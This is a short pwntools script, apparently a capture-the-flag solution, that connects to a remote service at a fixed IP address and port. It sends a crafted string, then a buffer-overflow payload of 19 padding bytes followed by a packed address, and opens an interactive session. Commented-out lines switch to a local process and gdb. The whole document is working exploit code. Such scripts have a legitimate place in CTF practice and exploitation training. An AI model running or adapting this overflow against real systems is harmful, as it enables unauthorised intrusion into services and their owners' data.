from pwn import *
#p=process('./Q_Q')
p=remote('121.40.92.129',28022)
#gdb.attach(p)
s2='you\x11need"pwntools!3'
#s2=p32(0x11756F79)
#s2=p32(0x6e11756f)
p.sendline(s2)
payload='a'*19+p32(0x8181B1B)
p.sendline(payload)
p.interactive()

